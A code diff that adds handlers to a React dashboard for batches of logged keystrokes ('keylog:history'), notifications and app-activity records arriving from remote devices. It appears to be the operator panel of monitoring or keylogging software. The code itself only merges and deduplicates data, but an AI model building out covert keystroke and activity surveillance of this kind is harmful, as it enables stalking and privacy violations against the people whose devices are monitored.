@@ -270,9 +270,33 @@ function AuthenticatedApp({ logout }) {
         }
         break;
 
+      case 'keylog:history':
+        if (data && data.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
+          setKeylogPushEntries(prev => {
+            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
+            const fresh = data.entries
+              .filter(e => !existingIds.has(e.id || e.timestamp))
+              .map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
+            return [...prev, ...fresh].slice(0, 500);
+          });
+        }
+        break;
+
       case 'notification:push':
         if (data && data.deviceId) {
           setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
+        }
+        break;
+
+      case 'notification:history':
+        if (data && data.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
+          setNotifPushEntries(prev => {
+            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
+            const fresh = data.entries
+              .filter(e => !existingIds.has(e.id || e.timestamp))
+              .map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
+            return [...prev, ...fresh].slice(0, 500);
+          });
         }
         break;
 
@@ -281,6 +305,18 @@ function AuthenticatedApp({ logout }) {
           setActivityAppEntries(prev => {
             if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
             return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
+          });
+        }
+        break;
+
+      case 'activity:history':
+        if (data && data.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
+          setActivityAppEntries(prev => {
+            const existingKeys = new Set(prev.map(e => `${e.deviceId}:${e.packageName}:${e.timestamp}`));
+            const fresh = data.entries
+              .filter(e => !existingKeys.has(`${data.deviceId}:${e.packageName}:${e.timestamp}`))
+              .map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
+            return [...prev, ...fresh].slice(0, 200);
           });
         }
         break;
